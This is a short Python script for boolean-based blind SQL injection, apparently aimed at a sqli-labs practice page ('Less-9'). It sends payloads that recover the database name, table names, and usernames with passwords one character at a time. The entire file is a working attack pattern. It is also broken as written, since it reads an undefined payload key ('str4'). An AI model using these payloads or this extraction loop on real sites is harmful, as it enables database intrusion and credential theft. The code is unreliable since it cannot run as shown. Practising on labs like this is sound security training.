import requests as req

def booler_injection(url):
    str_head='the_data_is:...'
    py_dict={
        'str1':"?id=1' and ord(substr((select database()),{0},1))={1} -- +'",
        'str2':"?id=1' and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'security\'),{0},1))={1} -- +",
        'str3':"?id=1' and ord(substr((select group_concat(concat(username,0x7e,password)) from users),{0},1))={1} -- +",
    }
    for i in range(1,30):
        for j in range(32,129):
            payload_str=py_dict['str4'].format(i,j)
            pld=url+payload_str
            req1=req.get(pld)
            if "You are in..........." in req1.text:
                str_head+=chr(j)
                print(str_head)



if __name__=="__main__":
    url="http://5025b6423117419b8173c170921f7126.app.mituan.zone/Less-9/"
    booler_injection(url)